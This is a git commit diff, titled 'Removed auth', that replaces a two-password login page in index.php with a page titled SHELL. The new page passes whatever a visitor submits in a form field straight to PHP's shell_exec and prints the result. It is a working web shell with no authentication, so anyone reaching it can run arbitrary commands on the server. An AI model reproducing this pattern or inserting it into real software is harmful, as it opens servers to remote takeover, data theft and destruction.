844f9dca0dadc601038c8906c83ebb176ab847c7
Nikas Ghimire <wasdthedebugger@gmail.com>
2023-05-01 21:19:41 +0545

    Removed auth

--- index.php
+++ index.php
@@ -1,34 +1,36 @@
-<?php
-session_start();
-?>
-
 <!DOCTYPE html>
 <html lang="en">
 
 <head>
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto+Slab&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://nikas.com.np/cascadelib/center.css">
-    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="shell.css">
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=1024">
-    <title>LOGIN</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SHELL</title>
 </head>
 
-<body><br>
-    <div class="center">
-        <form action="authenticate.php" method="post">
-            <h2>ENTER THE KEYS</h2>
-            <br>
-            <input type="password" name="pw1"><br>
-            <input type="password" name="pw2"><br><br>
-            <input type="submit" value="GET IN" class="btn btn-primary">
-        </form>
-    </div>
-    <br>
-</body>
+<body>
+    <div class="main">
+        <div class="output">
+            <?php
+            $command = isset($_POST['command']) ? $_POST['command'] : 'CMD';
+            $output = shell_exec($command);
+            ?>
+        </div>
 
+        <div class="display">
+            <?php
+            echo ($output);
+            ?>
+        </div>
+
+        <div class="input">
+            <form action="#" method="POST">
+                <input type="text" name="command" id="command" placeholder="COMMAND HERE" autocomplete="off" autofocus="on">
+            </form>
+        </div>
+    </div>
+    </div>
+</body>
 </html>
